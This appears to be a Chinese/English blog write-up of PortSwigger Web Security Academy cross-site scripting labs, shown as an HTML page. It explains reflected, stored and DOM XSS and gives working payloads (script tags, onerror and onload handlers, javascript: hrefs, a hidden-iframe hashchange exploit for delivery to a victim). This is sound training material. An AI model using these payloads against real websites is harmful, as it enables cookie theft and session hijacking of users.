@@ -1,0 +1,778 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  
+  <title>sleeper</title>
+
+  
+    <meta name="description" content="1234menu_id: moretitle: PortSwigger XSScategories: [PortSwigger,XSS]tags: [PortSwigger,XSS]    Cross-site scriptingLab: Reflected XSS into HTML context with nothing encoded This lab contains a simple">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sleeper">
+<meta property="og:url" content="http://example.com/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/index.html">
+<meta property="og:site_name" content="sleeper">
+<meta property="og:description" content="1234menu_id: moretitle: PortSwigger XSScategories: [PortSwigger,XSS]tags: [PortSwigger,XSS]    Cross-site scriptingLab: Reflected XSS into HTML context with nothing encoded This lab contains a simple">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082000474.png">
+<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082003744.png">
+<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082132162.png">
+<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509091133543.png">
+<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509091228400.png">
+<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509091245929.png">
+<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509092235316.png">
+<meta property="article:published_time" content="2025-09-07T21:38:47.652Z">
+<meta property="article:modified_time" content="2025-09-10T19:14:53.031Z">
+<meta property="article:author" content="she11f">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082000474.png">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.29.1">
+
+  
+    <link rel="shortcut icon" href="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/image%2Ficon.svg">
+  
+
+  
+
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC&display=swap" rel="stylesheet">-<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@200&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/image/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">sleeper</div><div class="sub normal cap">自由而全面的发展</div><div class="sub hover cap" style="opacity:0"> Stay hungry，Stay foolish</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/09/05/java/%E5%BC%80%E5%8F%91/JavaWeb/"><span class="title">JavaWeb 学习</span></a><a class="item title" href="/2025/03/26/work/%E6%8A%A4%E7%BD%91%E6%80%BB%E7%BB%93/"><span class="title">hvv知识点</span></a><a class="item title" href="/2025/02/13/go/%E5%BC%80%E5%8F%91/%E5%8A%9F%E8%83%BD%E5%BC%80%E5%8F%91/"><span class="title">go 红蓝武器库功能开发</span></a><a class="item title" href="/2025/05/10/%E9%9D%B6%E5%9C%BA/%E7%8E%84%E6%9C%BA/1/"><span class="title">第一章 应急响应-webshell查杀</span></a><a class="item title" href="/2025/03/30/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&CK(1)/"><span class="title">红日内网靶场 1</span></a><a class="item title" href="/2024/10/06/go/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8/"><span class="title">go 入门</span></a><a class="item title" href="/2024/12/09/src/%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98sql%E6%B3%A8%E5%85%A5/"><span class="title">批量挖掘 sql 注入</span></a><a class="item title" href="/2024/12/11/src/SpringBoot%20%E6%B3%84%E6%BC%8F/"><span class="title">SpringBoot 泄漏</span></a><a class="item title" href="/2024/09/09/java/%E5%BC%80%E5%8F%91/SpringMVC/"><span class="title">SpringMVC 学习</span></a><a class="item title" href="/2024/09/09/php/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E9%A2%98%E7%9B%AE/"><span class="title">php 代码审计</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-09-07T21:38:47.652Z">2025-09-08</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-09-10T19:14:53.031Z">2025-09-10</time></span></div></div></div>
+    
+  </div>
+  </div><article class="md-text content"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">menu_id: more</span><br><span class="line">title: PortSwigger XSS</span><br><span class="line">categories: [PortSwigger,XSS]</span><br><span class="line">tags: [PortSwigger,XSS]</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Cross-site-scripting"><a href="#Cross-site-scripting" class="headerlink" title="Cross-site scripting"></a>Cross-site scripting</h1><h3 id="Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded"><a href="#Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Lab: Reflected XSS into HTML context with nothing encoded"></a>Lab: Reflected XSS into HTML context with nothing encoded</h3><blockquote>
+<p>This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.</p>
+<p>To solve the lab, perform a cross-site scripting attack that calls the alert function.</p>
+</blockquote>
+<p><strong>Payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-Stored-XSS-into-HTML-context-with-nothing-encoded"><a href="#Lab-Stored-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Lab: Stored XSS into HTML context with nothing encoded"></a>Lab: Stored XSS into HTML context with nothing encoded</h3><blockquote>
+<p>This lab contains a stored cross-site scripting vulnerability in the comment functionality.        </p>
+<p>To solve this lab, submit a comment that calls the <code>alert</code> function when the blog post is viewed.        </p>
+</blockquote>
+<p>Open a block entry or post, scroll down to the comment section and type in my payload,and click at the back to blog link. And you can see we called the alert function. </p>
+<p><strong>Payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-DOM-XSS-in-document-write-sink-using-source-location-search"><a href="#Lab-DOM-XSS-in-document-write-sink-using-source-location-search" class="headerlink" title="Lab: DOM XSS in document.write sink using source location.search"></a>Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code></h3><blockquote>
+<p>This lab contains a DOM-based cross-site scripting  vulnerability in the search query tracking functionality. It uses the  JavaScript <code>document.write</code> function, which writes data out to the page. The <code>document.write</code> function is called with data from <code>location.search</code>, which you can control using the website URL.        </p>
+<p>To solve this lab, perform a cross-site scripting attack that calls the <code>alert</code> function.        </p>
+</blockquote>
+<p>Let’s access the lab,and type in the search line “she11f”,then click the search button.now right click and choose Inspect </p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082000474.png" alt="image-20250908200032425"></p>
+<p>In the search bar look for the string “she11f”</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082003744.png" alt="image-20250908200343690"></p>
+<p>You can see the string was placed inside a image source tag, now close the developer tools go back to the search bar and type in the following close string and tag and put in an svg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>OR</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search"><a href="#Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search" class="headerlink" title="Lab: DOM XSS in innerHTML sink using source location.search"></a>Lab: DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></h3><blockquote>
+<p>This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an <code>innerHTML</code> assignment, which changes the HTML contents of a <code>div</code> element, using data from <code>location.search</code>.        </p>
+<p> To solve this lab, perform a cross-site scripting attack that calls the <code>alert</code> function.        </p>
+</blockquote>
+<p>这题跟上一题略微不同，上一题用的是 document.write. 这题插入dom用的是 innerHTML。**<code>innerHTML</code><strong>和</strong><code>document.writ</code>**的执行时机略有不同</p>
+<ul>
+<li><strong><code>innerHTML</code><strong>：无论页面是否加载完成，都可以调用，且只会修改目标元素的内容，</strong>不会影响整个文档结构</strong>。<br>即使页面已经加载完毕（DOM 已生成），调用 <code>innerHTML</code> 只会替换指定元素的内容，其他部分不受影响。</li>
+<li>**<code>document.write</code>**：<ul>
+<li>如果在<strong>页面加载过程中</strong>（文档流未关闭时）调用，内容会被正常插入到文档流中，成为页面的一部分。</li>
+<li>如果在<strong>页面加载完成后</strong>（文档流已关闭）调用，会<strong>清空当前页面的所有内容</strong>，重新创建一个新的文档流并写入内容（相当于覆盖整个页面）。<br>例：页面加载完成后执行 <code>document.write(&quot;hello&quot;)</code>，原页面内容会被全部清除，只显示 “hello”。</li>
+</ul>
+</li>
+</ul>
+<p>所以这里当我们尝试 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 能看到确实写入DOM结构了，但是并没有执行，</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509082132162.png" alt="image-20250908213217066"></p>
+<ul>
+<li>**<code>innerHTML</code>**：设计用于修改已有 DOM 元素的内容，浏览器会对插入的 <code>&lt;script&gt;</code> 进行安全限制，避免动态插入的脚本意外执行（防止 XSS 风险扩散）。</li>
+<li>**<code>document.write</code>**：模拟页面初始加载时的 HTML 解析流程，完全遵循原始 HTML 的解析规则（包括执行 <code>&lt;script&gt;</code>），因此脚本会被正常执行。</li>
+</ul>
+<p>所以正是因为这种机制导致直接插入 js 脚本无法直接执行，但是 innerHTML 的安全限制无法阻止其他标签的事件属性中脚本的执行。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="Lab: DOM XSS in jQuery anchor href attribute sink using location.search source"></a>Lab: DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</h3><blockquote>
+<p>​            This lab contains a DOM-based cross-site scripting  vulnerability in the submit feedback page. It uses the jQuery library’s <code>$</code> selector function to find an anchor element, and changes its <code>href</code> attribute using data from <code>location.search</code>.        </p>
+<p>​            To solve this lab, make the “back” link alert <code>document.cookie</code>.        </p>
+</blockquote>
+<p>题目描述告诉我们，漏洞点再 feedback 页面，翻译一下就是</p>
+<blockquote>
+<p>这个实验包含一个基于 DOM 的跨站脚本漏洞，存在于提交反馈页面中。它使用 jQuery 库的<code>$</code>选择器函数查找一个锚点元素（即<code>&lt;a&gt;</code>标签），并利用来自<code>location.search</code>的数据修改该元素的<code>href</code>属性。</p>
+<p>要解决这个实验，请让 “返回” 链接弹出<code>document.cookie</code>（即显示当前页面的 Cookie 信息）。</p>
+</blockquote>
+<p>我们来到 feedback 页面，一开始是 feedback?returnPath&#x3D;&#x2F;post，我们随便输入一个 she11f 回车后控制台搜一下 she11f</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;backLink&quot; href=&quot;she11f&quot;&gt;Back&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说 returnPath 这个参数直接被写入 href 里面了，所以我们就可以这样构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie)</span><br><span class="line">// href 中使用 javascript: 作为协议前缀，这是一种特殊的 “伪协议”（非标准网络协议），其作用是：将 : 后面的内容当作 JavaScript 代码执行。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后再点击 back 就能触发 js 事件</p>
+<h3 id="Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="Lab: DOM XSS in jQuery selector sink using a hashchange event"></a>Lab: DOM XSS in jQuery selector sink using a hashchange event</h3><blockquote>
+<p>​            This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery’s <code>$()</code> selector function to auto-scroll to a given post, whose title is passed via the <code>location.hash</code> property.        </p>
+<p>​            To solve the lab, deliver an exploit to the victim that calls the <code>print()</code> function in their browser.        </p>
+<p>这个实验在首页存在一个基于 DOM 的跨站脚本漏洞。它使用 jQuery 的 $() 选择器函数来自动滚动到指定的帖子，而该帖子的标题是通过 location.hash 属性传递的。</p>
+<p>要解决这个实验，请向受害者发送一个攻击 payload，使其浏览器执行 print () 函数（即触发打印功能）。</p>
+</blockquote>
+<p>说实话没看懂，后面油管看的教程。</p>
+<p>题目描述说帖子标题是通过  location.hash 属性传递的，我们问问ai吧</p>
+<blockquote>
+<p><code>location.hash</code> 是 JavaScript 中用于获取或设置当前 URL 中 <strong><code>#</code> 后面部分</strong>的属性，也被称为 “哈希值” 或 “锚点”。</p>
+</blockquote>
+<p>f12看一下控制台源码，全局搜索一下   location.hash</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">on</span>(<span class="string">&#x27;hashchange&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                           <span class="keyword">var</span> post = $(<span class="string">&#x27;section.blog-list h2:contains(&#x27;</span> + <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">                           <span class="keyword">if</span> (post) post.<span class="title function_">get</span>(<span class="number">0</span>).<span class="title function_">scrollIntoView</span>();</span><br><span class="line">                       &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>有 $ 说明是 jQuery，这段代码绑定了一个 hashchange 监听器，当URL 中 <strong><code>#</code> 后面部分</strong>的属性变化时，就会匹配  <code>section.blog-list</code> 区域内的 <code>&lt;h2&gt;</code> 标签 ，我们找一下这些元素</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509091133543.png" alt="image-20250909113304422"></p>
+<p>其实就是每篇文章的标题，我们可以试一下在 url 后面拼接 <code>#Awkward Breakups</code> 会车发现直接滚动到 Awkward Breakups 标题位置这里了，我们控制台分别打印一下 <code>decodeURIComponent(window.location.hash.slice(1)) + &#39;)&#39;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;21st Century Dreaming)&quot; </span><br></pre></td></tr></table></figure>
+
+<p>这边因为 post 作用域是局部变量，所以控制台不好打印，我们直接打印 <code>$(&#39;section.blog-list h2:contains(&#39; + decodeURIComponent(window.location.hash.slice(1)) + &#39;)&#39;) </code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object &#123; 0: h2, selector: &quot;section.blog-list h2:contains(21st Century Dreaming)&quot;, length: 1, prevObject: &#123;…&#125;, context: HTMLDocument https://0a1d00120321917c80bd0301008f001b.web-security-academy.net/#21st%20Century%20Dreaming &#125;</span><br></pre></td></tr></table></figure>
+
+<p>是一个对象，再打印一下 post.get[0],</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以跳转到标题的原理就是如此。</p>
+<p>我们搜索一下 location.hash XSS,可以找到这篇文章 <a target="_blank" rel="noopener" href="https://bugs.jquery.com/ticket/9521/">https://bugs.jquery.com/ticket/9521/</a> ，里面有这样关键的一句话，</p>
+<blockquote>
+<p>“$(location.hash)” expected CSS selector in many case, but this code also can create html element.</p>
+</blockquote>
+<p>这句话的意思是 当 css 选择器找不到  <code>$(location.hash)</code> 中的哈希值（<code>#</code> 后的内容），jQuery 可能会将其解析为 HTML 标签并创建新的 DOM 元素。</p>
+<p>也就是我们后面可以传递一个带有时间的 html 元素</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;img src=1&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到网络请求里返回了404状态码，说明img标签被解析了，只是找不到这个资源</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509091228400.png" alt="image-20250909122809234"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功弹窗，但是我们这个hash改变事件要主动改变#后面的值才行，用户肯定是不会自己改变的。我的意思是加入我们把这个 payload发给用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/#&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用户打卡是并不会弹窗的，因为没有改这个 # 后面的值就不会触发 hashchange 事件，所以我们要主动修改 src，找到一个方法首先加载 普通的 url，然后加载完url之后，我们把payload插入 url中。</p>
+<p>我们可以使用 iframe 标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://0a1d00120321917c80bd0301008f001b.web-security-academy.net/#&quot; onload=&quot;this.src+=&#x27;&lt;img src=1 onerror=print()&gt;&#x27;&quot; &gt;</span><br></pre></td></tr></table></figure>
+
+<p>如此，可以在src加载时修改hash的值，当然也可以加上hidden属性，这样用户看不到就更hacker了</p>
